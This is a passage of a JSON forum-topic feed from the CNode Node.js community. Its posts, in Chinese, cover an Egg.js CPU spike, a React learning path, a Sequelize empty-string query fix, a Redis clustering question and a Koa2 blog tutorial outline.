&#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;agent_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:39980}\n31557 ?        Rl     6:56 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;agent_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:45792}\n31580 ?        Rl     6:27 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:45792}\n31582 ?        Rl     6:24 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:45792}\n31584 ?        Rl     6:22 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:45792}\n31596 ?        Rl     6:29 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:45792}\n32705 ?        Rl     0:18 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:35401}\n</code></pre></div>","title":"egg 应用机器凌晨0点 cpu 飙升到100%","last_reply_at":"2019-04-20T22:11:51.913Z","good":false,"top":false,"reply_count":9,"visit_count":1377,"create_at":"2019-04-19T07:34:40.024Z","author":{"loginname":"xiaozhongliu","avatar_url":"https://avatars3.githubusercontent.com/u/17674404?v=4&s=120"}},{"id":"5cb336e0dad66d658e408cb1","author_id":"58183a621a9a7d9909531351","tab":"share","content":"<div class=\"markdown-text\"><h3>项目概览</h3>\n<ul>\n<li>JS 插件文档库地址：<a href=\"https://www.yuque.com/pengloo53/web\">JS 插件文档库 · 语雀</a></li>\n<li>在线演示代码仓库：<a href=\"https://github.com/pengloo53/js-plugin-example\">JS 插件文档库示例代码 · GitHub</a></li>\n<li>在线预览：<a href=\"http://js.90byte.com/page\">JS 插件在线演示</a></li>\n</ul>\n<h3>项目介绍</h3>\n<p>如今，随着大前端的发展，曾经的霸主：jQuery 也渐渐的陨落，随之一起没落的，也包含基于 jQuery 的一些优秀的插件。这些优秀的插件，让我们在前端的开发中，节省了大量的时间。自己的项目中也使用了大部分基于 jQuery 的前端插件，帮助我实现了很多的功能，节省了大量的开发时间。</p>\n<p>所以，我计划发起一个开源项目，整理并收集这些优秀的前端插件的使用方法，并提供示例代码，可供调试和学习。一来为了留个存档，二来也是为了分享出去，帮助到需要的人。</p>\n<blockquote>\n<p>该文档起于 jQuery 框架，但不止于 jQuery，希望能整理所有的 Web 前端框架。</p>\n</blockquote>\n<p>期待你的加入，一起维护文档，语雀文档协作<a href=\"https://www.yuque.com/g/pengloo53/web/collaborator/join?token=rMudjrT0PjYZv8BR\">邀请链接</a>，如果链接过期，请加个人微信号：<strong>P_lu0503</strong>，并备注：<strong>文档协作</strong>。</p>\n<p>为了文档的可用性，我希望每一个插件都有一篇独立文档，以及独立在线演示。</p>\n<h3>文档介绍</h3>\n<p>文档在语雀平台上，期待你的加入进行协作编写，不要求所有的配置项都介绍到，列举一些最常见的即可。文档主要包括以下几个方面的描述：</p>\n<ul>\n<li>简单介绍：插件的用途，使用场景，以及官方文档链接；</li>\n<li>开始使用：如何正确的引入库文件到页面中，这一点对于初学者很重要；</li>\n<li>使用示例（需要代码演示）：\n<ul>\n<li>前台 HTML 如何编写</li>\n<li>前台 JS 如何调用</li>\n<li>后台数据返回的格式（不限后台技术，重点关注返回数据的格式）</li>\n</ul>\n</li>\n</ul>\n<h3>在线演示</h3>\n<p>每一个插件都有一个独立的页面可供访问，在线演示原代码在 <a href=\"https://github.com/pengloo53/js-plugin-example\">GitHub</a> 上，采用 Node 语言编写，可以自行部署在本地，便于调试，尝试插件不同参数的用法。</p>\n<p>熟悉 Node + Express 框架的可以直接 fork 项目，并提交 pull requests，如果不熟悉 Node 开发，也没关系，我会定期将文档中新增的插件，做成演示示例，push 到 GitHub 仓库。</p>\n<p>另外，也提供了<a href=\"http://js.90byte.com/page\">在线预览</a>。</p>\n<h3>本地部署步骤</h3>\n<ol>\n<li>安装 Node 环境</li>\n<li>安装 supervisor，安装方法：<code>npm i -g supervisor</code></li>\n<li>安装 bower 包管理器，安装方法：<code>npm i -g bower</code></li>\n<li>克隆代码到本地，顺便点个 Star</li>\n<li>进入项目目录，安装依赖，<code>npm install</code> 以及 <code>bower install</code></li>\n<li>运行项目，<code>npm start</code></li>\n<li>浏览器打开项目：<code>http://localhost:3030/page</code></li>\n</ol>\n</div>","title":"JS 插件文档库邀你一起协同创作","last_reply_at":"2019-04-20T14:43:07.091Z","good":false,"top":false,"reply_count":2,"visit_count":1099,"create_at":"2019-04-14T13:34:24.759Z","author":{"loginname":"pengloo53","avatar_url":"https://avatars3.githubusercontent.com/u/5508125?v=4&s=120"}},{"id":"5b972808ce9d14c2254df8b0","author_id":"56ea011fa70420bd420d0001","tab":"share","content":"<div class=\"markdown-text\"><p>楼主自己也是才踩 react 的路。。之前偷懒用了 vuejs 就不思上进了…无赖美帝都是 react 占据了90个点的江山.*\n**一直觉得学习，选择好的学习资料和学习的顺序很重要… 对了，路子顺…挫折感小. ** 希望自己的学习顺序，能给别人带来帮助.\n群主弄了个 QQ 技术交流群: 371932256 ，方便讨论我的 cnodejs 的 react 版本的项目…一起进步…也欢迎高手加入…哈哈…</p>\n<ol>\n<li>\n<p>掌握 react 的基本概念\n1.1 看视频课程：<a href=\"https://time.geekbang.org/course/intro/100\">https://time.geekbang.org/course/intro/100</a> （非推广…只是个人是个很热心的妹砸） 01 ~10\n1.2 边看然后边刷官方的 Main Concepts 部分的文档https://reactjs.org/docs/hello-world.html 做好第一步和第二步后，对 react 有基本的概念了…</p>\n</li>\n<li>\n<p>学习 redux/react-redux\n2.1 看ruanyifeng 的 redux/react-redux 教程… 看教程第一二篇的时候，会有个基本的概念呢…\n2.2  然后返回去看 11~ 15， 视频讲解的 redux、react 课程\n当然你在刷课课程中，也会不时的去看看官方文档看看些细节. flux 等概念\n2.3  在上述步骤（3.1 ~3.2 ） 中，你会做 Counter 的例子，了解 redux 的基本玩法… 也会把 Counter的例子改成结合 react-redux 类型的;\n如果这两个例子完成了…可以试试这个视频教程…\n2.4 完成一个小demo: <a href=\"https://www.youtube.com/watch?v=93p3LxR9xfM&amp;t=1168s\">https://www.youtube.com/watch?v=93p3LxR9xfM&amp;t=1168s</a> 这部分想必，对新手会绕一段时间…特别是 redux 这部分如果你没进去看过源码…有时候会被 API 绕晕…觉得 API 多\n这边是楼主写的 redux 阅读笔记: <a href=\"https://github.com/pandoracat/learn-react/blob/master/Notes/Redux/includes/markdown/ReduxSourceCode.md\">https://github.com/pandoracat/learn-react/blob/master/Notes/Redux/includes/markdown/ReduxSourceCode.md</a></p>\n</li>\n<li>\n<p>完成学习 react基本概念… redux/react-redux 基本用法后…（一定要试着敲每个课程的代码哟，扎扎实实走过来的，你内心才踏实)\n可以直接去 react-router 官网看看 demo, 边用用demo, 了解文档，了解用法. 如果有朋友觉得英文文档看起来吃力，可以看看这个 <a href=\"https://www.jianshu.com/p/1781bc1dd938#24-history\">https://www.jianshu.com/p/1781bc1dd938#24-history</a></p>\n</li>\n<li>\n<p>学习完这些后，咱看看 react 项目，代码咋拆分…咋组织\n课程22~25 ： <a href=\"https://time.geekbang.org/course/detail/100-11278\">https://time.geekbang.org/course/detail/100-11278</a></p>\n</li>\n<li>\n<p>这些都过了,下面看 react 怎么测试。关于 react 测试： 强行硬广一波自己的笔记：<a href=\"https://github.com/pandoracat/frontend-testing\">https://github.com/pandoracat/frontend-testing</a> ，我记录了自己的 javascript 测试的学习路程…</p>\n</li>\n<li>\n<p>上面这些你都做了…咱们再把视频教程撸撸… 再次提升下自己的理解…</p>\n</li>\n<li>\n<p>最后，react cnode , 新手练手都用它 😎…看看 它的 api, 咱们 ready go 写个项目试试.\n这边是我正在写的 <a href=\"https://github.com/pandoracat/react-cnode\">https://github.com/pandoracat/react-cnode</a> 欢迎瞧瞧…我会写自己的 readme, 方便你照着模仿一个…\n弱弱的觉得自己设计的风格还不错（偷笑,我是一个审美超级弱的前端妹纸）\n怎么开始这个用 <a href=\"http://cnodejs.org\">cnodejs.org</a> 做 api 服务器的练手项目呢?请点击：<a href=\"https://github.com/pandoracat/react-cnode\">https://github.com/pandoracat/react-cnode</a></p>\n</li>\n</ol>\n<p>群主弄了个 QQ 技术交流群: 371932256 ，方便讨论我的 cnodejs 的 react 版本的项目…一起进步…也欢迎高手加入…哈哈…</p>\n</div>","title":"分享自己的 react 学习路径","last_reply_at":"2019-04-20T13:52:47.113Z","good":false,"top":false,"reply_count":34,"visit_count":4728,"create_at":"2018-09-11T02:27:20.076Z","author":{"loginname":"alicePan","avatar_url":"https://avatars2.githubusercontent.com/u/9105986?v=4&s=120"}},{"id":"5c38830c3898674067a7e3a4","author_id":"56309c1c10b7dd644461fc35","tab":"share","content":"<div class=\"markdown-text\"><p>能用的API都用上了，可以发帖、回复、收藏和点赞。Android平台建议使用Chrome浏览，iOS平台建议使用Safari浏览，点击“添加到主屏幕”可以安装独立的应用。</p>\n<p>技术栈为vue + vuetify + vue-router + vuex，由于使用了UI框架，开发起来难度不高，代码写的不好的地方欢迎批评或提交PR。</p>\n<p>地址：<a href=\"https://cnode.ikholin.com\">https://cnode.ikholin.com</a></p>\n<p>源码：<a href=\"https://github.com/oodzchen/CNode-V\">https://github.com/oodzchen/CNode-V</a></p>\n<p>来自 <a href=\"https://github.com/oodzchen/CNode-V\">CNode-V</a></p>\n</div>","title":"我也给CNode社区做了个PWA","last_reply_at":"2019-04-20T02:23:02.301Z","good":true,"top":false,"reply_count":38,"visit_count":4579,"create_at":"2019-01-11T11:50:36.917Z","author":{"loginname":"oodzchen","avatar_url":"https://avatars1.githubusercontent.com/u/9650699?v=4&s=120"}},{"id":"5c18d6837ec239239ff582b8","author_id":"5c179fa17ec239239ff57b8f","tab":"ask","content":"<div class=\"markdown-text\"><p>请大神们推荐几本教材啊</p>\n</div>","title":"想学node.js, 有什么教材推荐吗","last_reply_at":"2019-04-19T14:49:08.730Z","good":false,"top":false,"reply_count":22,"visit_count":2532,"create_at":"2018-12-18T11:14:11.553Z","author":{"loginname":"sxuni","avatar_url":"https://avatars2.githubusercontent.com/u/16433603?v=4&s=120"}},{"id":"54178b5c6151dc272f66e044","author_id":"52131c790a746c580b4d04d9","tab":"share","content":"<div class=\"markdown-text\"><p>项目地址：<a href=\"https://github.com/Khan/KaTeX\">KaTeX</a></p>\n<p>支持主流的浏览器：Chrome, Firefox, Safari, Opera和 IE8-IE11。</p>\n<ul>\n<li>**快速：**并发渲染，无需重排页面。根据<a href=\"http://jsperf.com/katex-vs-mathjax\">这个测试</a>，性能绝对秒杀<a href=\"http://www.mathjax.org/\">MathJax</a>；\n+**渲染效果好：**采用TeX语法，渲染效果达到印刷出版级别；\n+**无依赖：**不依赖其它库；\n+**支持服务器端渲染：**例如，服务器端的Node.js程序调用KaTeX，把渲染好的HTML片段直接发送给客户端。</li>\n</ul>\n<p>看起来不错，值得试用。</p>\n</div>","title":"KaTeX： 可汗学院出品，号称“最快”的数学公式渲染库","last_reply_at":"2019-04-19T09:34:33.940Z","good":false,"top":false,"reply_count":16,"visit_count":12558,"create_at":"2014-09-16T00:59:08.936Z","author":{"loginname":"bnuhero","avatar_url":"//gravatar.com/avatar/cefc4edf683bb205aa6291358e747ebb?size=48"}},{"id":"5cb992d7a86ae80ce64b12fa","author_id":"5c1af36a3898674067a7632a","tab":"share","content":"<div class=\"markdown-text\"><p>事件触发机制实现<img src=\"//static.cnodejs.org/FtMRn7Ru0NM8Zr4SlHA0HL7PbMCj\" alt=\"cb.png\">\npromise方式实现<img src=\"//static.cnodejs.org/Fi63cTqkPnHMhwvTNRlc_-TnObD9\" alt=\"promise.png\"></p>\n</div>","title":"键盘数据录入+不换行控制台输出","last_reply_at":"2019-04-19T09:20:23.508Z","good":false,"top":false,"reply_count":0,"visit_count":554,"create_at":"2019-04-19T09:20:23.508Z","author":{"loginname":"jiangyan33","avatar_url":"https://avatars3.githubusercontent.com/u/35300813?v=4&s=120"}},{"id":"5cb857b3a86ae80ce64b0cc2","author_id":"595d976b10d696af07768a24","tab":"share","content":"<div class=\"markdown-text\"><h1>sequelize 查找空字符串报错</h1>\n<blockquote>\n<p>需求：找出为&quot;&quot;或者为null的行数</p>\n</blockquote>\n<h2>错误版本</h2>\n<pre class=\"prettyprint language-js\"><code>const count = await Model.count({\n      where: {\n        $or: [\n          { value: null },\n          { value: &#x27;&#x27; },\n        ],\n      },\n    });\n</code></pre><pre class=\"prettyprint\"><code>sql: SELECT count(*) AS &#96;count&#96; FROM &#96;setting&#96; AS &#96;setting&#96; WHERE ((&#96;setting&#96;.&#96;deleted_at&#96; &gt; &#x27;2019-04-16 10:02:39&#x27; OR &#96;setting&#96;.&#96;deleted_at&#96; IS NULL) AND (&#96;setting&#96;.&#96;required&#96; = true AND (&#96;setting&#96;.&#96;value&#96; IS NULL OR &#96;setting&#96;.&#96;value&#96; = &#x27;\\&quot;\\&quot;&#x27;)));\n</code></pre><ul>\n<li>原因：<a href=\"http://www.voidcn.com/article/p-hoohudwl-re.html\">nodejs sequelize库防注入测试</a>，Model.count把’‘转义了’&quot;&quot;’</li>\n</ul>\n<h2>正确版本</h2>\n<pre class=\"prettyprint language-js\"><code>const count = await this.app.model.Setting.count({\n      where: {\n        $or: [\n          { value: null },\n          literal(&#x27;value = &quot;&quot;&#x27;),\n        ],\n      },\n    });\n</code></pre></div>","title":"sequelize 查找空字符串报错","last_reply_at":"2019-04-19T06:44:01.226Z","good":false,"top":false,"reply_count":1,"visit_count":555,"create_at":"2019-04-18T10:55:47.583Z","author":{"loginname":"18820227745","avatar_url":"https://avatars0.githubusercontent.com/u/25097125?v=4&s=120"}},{"id":"5ca3157831010b2dfbb424bf","author_id":"5c47dd816955112b99437e7f","tab":"ask","content":"<div class=\"markdown-text\"><p>node集群起了服务，每个服务上重复订阅了redis的过期通知，然后当redis的发布过期通知时，会向每个服务发送过期通知吗？如何解决服务重复消费redis的过期通知？</p>\n</div>","title":"node集群下重复消费redis的过期通知","last_reply_at":"2019-04-19T06:26:50.458Z","good":false,"top":false,"reply_count":2,"visit_count":776,"create_at":"2019-04-02T07:55:36.744Z","author":{"loginname":"jiazhuoyi","avatar_url":"https://avatars1.githubusercontent.com/u/17874998?v=4&s=120"}},{"id":"5b1939ad29e6e510415b2916","author_id":"5ad9731bba60fcc66b7b86aa","tab":"share","content":"<div class=\"markdown-text\"><p>最近利用空闲时间写了一个从入门到上线的的node实战教程《Node.js从入门到上线》A blog build with Koa2. 目前还在更新中，入门篇已基本成型。</p>\n<p>本项目使用es6语法，采用Koa2 + mongoose 搭建了一个博客系统，实现了文章管理、用户登录注册、权限控制、分类管理等功能。</p>\n<p>GitHub: <a href=\"https://github.com/liuxing/node-blog\">https://github.com/liuxing/node-blog</a></p>\n<h2>目录</h2>\n<p><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/1.1Node.js%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE.md\">1.1  Node.js 的安装与配置</a></p>\n<ul>\n<li><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/1.1Node.js%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE.md#%E5%AE%89%E8%A3%85nodejs\">安装Node.js</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/1.1Node.js%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE.md#%E4%BD%BF%E7%94%A8-nvm\">使用nvm</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/1.1Node.js%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE.md#%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7\">一些有用的工具</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/1.1Node.js%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE.md#hello-node\">hello-node</a></li>\n</ul>\n<p><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/1.2Node.js%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88.md\">1.2 Node.js 基础概览</a></p>\n<ul>\n<li><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/1.2Node.js%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88.md#node%E6%A8%A1%E5%9D%97\">node模块</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/1.2Node.js%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88.md#npm%E6%A8%A1%E5%9D%97%E7%AE%A1%E7%90%86%E5%99%A8\">npm包管理器</a></li>\n</ul>\n<p><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/2.1Koa2%E5%88%9D%E4%BD%93%E9%AA%8C.md\">2.1 Koa2初体验</a></p>\n<ul>\n<li>\n<p><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/2.1Koa2%E5%88%9D%E4%BD%93%E9%AA%8C.md#hello-koa2\">Hello Koa2</a></p>\n</li>\n<li>\n<p><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/2.1Koa2%E5%88%9D%E4%BD%93%E9%AA%8C.md#%E4%BD%BF%E7%94%A8supervisor-%E6%88%96%E8%80%85-nodemon\">使用supervisor 或者 nodemon</a></p>\n</li>\n</ul>\n<p><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/2.2MongoDB%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8.md\">2.2 MongoDB的安装及使用</a></p>\n<p><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/3.1%E5%BC%80%E5%8F%91%E5%89%8D%E7%9A%84%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE.md\">3.1 开发前的项目配置</a></p>\n<ul>\n<li><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/3.1%E5%BC%80%E5%8F%91%E5%89%8D%E7%9A%84%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE.md#%E8%A7%84%E5%88%92%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84\">规划项目目录结构</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/3.1%E5%BC%80%E5%8F%91%E5%89%8D%E7%9A%84%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE.md#%E4%BD%BF%E7%94%A8editorconfig\">使用editorconfig</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/3.1%E5%BC%80%E5%8F%91%E5%89%8D%E7%9A%84%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE.md#%E4%BD%BF%E7%94%A8commitizen\">使用commitizen</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/3.1%E5%BC%80%E5%8F%91%E5%89%8D%E7%9A%84%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE.md#%E4%BD%BF%E7%94%A8eslint\">使用eslint</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/3.1%E5%BC%80%E5%8F%91%E5%89%8D%E7%9A%84%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE.md#%E4%BD%BF%E7%94%A8git-hooks%E8%87%AA%E5%8A%A8%E6%A3%80%E6%9F%A5%E4%BB%A3%E7%A0%81\">使用Git hooks自动检查代码</a></li>\n</ul>\n<p><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/3.2%E6%8A%8A%E9%A1%B9%E7%9B%AE%E8%B7%91%E8%B5%B7%E6%9D%A5.md\">3.2 把项目跑起来</a></p>\n<ul>\n<li><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/3.2%E6%8A%8A%E9%A1%B9%E7%9B%AE%E8%B7%91%E8%B5%B7%E6%9D%A5.md#router\">router</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/3.2%E6%8A%8A%E9%A1%B9%E7%9B%AE%E8%B7%91%E8%B5%B7%E6%9D%A5.md#%E9%85%8D%E7%BD%AE%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E\">配置模板引擎</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/3.2%E6%8A%8A%E9%A1%B9%E7%9B%AE%E8%B7%91%E8%B5%B7%E6%9D%A5.md#%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90\">配置静态资源</a></li>\n</ul>\n<p><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/3.3%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93.md\">3.3 使用mongoose操作数据库</a></p>\n<ul>\n<li>\n<p><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/3.3%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93.md#%E8%AE%BE%E8%AE%A1schema\">设计Schema</a></p>\n</li>\n<li>\n<p><a href=\"https://github.com/liuxing/abc-blog/tree/master/docs/3.3%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93.md#%E4%BD%BF%E7%94%A8model\">使用model</a></p>\n</li>\n</ul>\n<p><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.4%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E4%B8%8E%E7%99%BB%E5%BD%95.md\">3.4用户注册与登录</a></p>\n<ul>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.4%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E4%B8%8E%E7%99%BB%E5%BD%95.md#cookie%E4%B8%8Esession\">cookie与session</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.4%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E4%B8%8E%E7%99%BB%E5%BD%95.md#%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C\">用户注册</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.4%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E4%B8%8E%E7%99%BB%E5%BD%95.md#%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95\">用户登录</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.4%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E4%B8%8E%E7%99%BB%E5%BD%95.md#%E7%94%A8%E6%88%B7%E7%99%BB%E5%87%BA\">用户登出</a></li>\n</ul>\n<p><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.5koa2%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%BC%80%E5%8F%91.md\">3.5 koa2中间件开发</a></p>\n<ul>\n<li>\n<p><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.5koa2%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%BC%80%E5%8F%91.md#koa2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%9C%BA%E5%88%B6\">koa2 中间件机制</a></p>\n</li>\n<li>\n<p><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.5koa2%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%BC%80%E5%8F%91.md#%E6%B6%88%E6%81%AF%E9%97%AA%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BB%B6\">消息闪现中间件</a></p>\n</li>\n</ul>\n<p><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.6%E6%96%87%E7%AB%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5.md\">3.6 文章增删改查</a></p>\n<ul>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.6%E6%96%87%E7%AB%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5.md#%E6%96%87%E7%AB%A0%E6%A8%A1%E5%9E%8B%E8%AE%BE%E8%AE%A1\">文章模型设计</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.6%E6%96%87%E7%AB%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5.md#%E6%96%87%E7%AB%A0%E5%8F%91%E8%A1%A8\">文章发表</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.6%E6%96%87%E7%AB%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5.md#%E6%96%87%E7%AB%A0%E5%88%97%E8%A1%A8%E4%B8%8E%E8%AF%A6%E6%83%85\">文章列表与详情</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.6%E6%96%87%E7%AB%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5.md#%E6%96%87%E7%AB%A0%E7%BC%96%E8%BE%91%E4%B8%8E%E5%88%A0%E9%99%A4\">文章编辑与删除</a></li>\n</ul>\n<p><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.7%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6.md\">3.7 用户权限控制</a></p>\n<ul>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.7%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6.md#%E7%99%BB%E5%BD%95%E7%8A%B6%E6%80%81%E6%A3%80%E6%9F%A5\">登录状态检查</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.7%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6.md#%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6\">管理权限控制</a></li>\n</ul>\n<p><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.8%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.md\">3.8 评论功能</a></p>\n<ul>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.8%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.md#%E8%AE%BE%E8%AE%A1%E8%AF%84%E8%AE%BA%E7%9A%84%E6%A8%A1%E5%9E%8B\">设计评论的模型</a></li>\n<li><a 